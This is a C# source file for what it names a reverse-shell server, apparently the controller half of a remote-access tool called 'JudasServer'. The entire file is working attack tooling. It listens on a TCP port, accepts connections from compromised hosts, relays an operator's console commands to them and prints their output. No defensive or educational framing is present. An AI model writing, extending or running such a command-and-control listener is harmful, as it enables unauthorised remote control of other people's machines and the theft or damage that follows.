using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
namespace JudasServer;

class ReverseShellServer
{
    public static void Start(string ipAddress = "::1", int port = 1234)
    {
        TcpListener listener = new TcpListener(IPAddress.Parse(ipAddress), port);
        listener.Start();

        Console.WriteLine("等待连接...");

        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            Console.WriteLine("连接成功！");

            string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();

            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);

            while (true)
            {
                Console.Write("[" + clientIP + "]#>");
                string input = Console.ReadLine();
                Console.WriteLine("-------------------------------------");

                writer.WriteLine(input);
                writer.Flush();

                StringBuilder responseBuilder = new StringBuilder();
                int character;
                while ((character = reader.Read()) != -1)
                {
                    char ch = (char)character;
                    responseBuilder.Append(ch);

                    if (ch == '\n')
                    {
                        string response = responseBuilder.ToString().Trim();
                        if (response.EndsWith("echo end"))
                        {
                            responseBuilder.Clear();
                            Console.WriteLine("-------------------------------------");
                            break;
                        }

                        Console.WriteLine(response);
                        responseBuilder.Clear();
                    }
                }
            }
        }
    }
}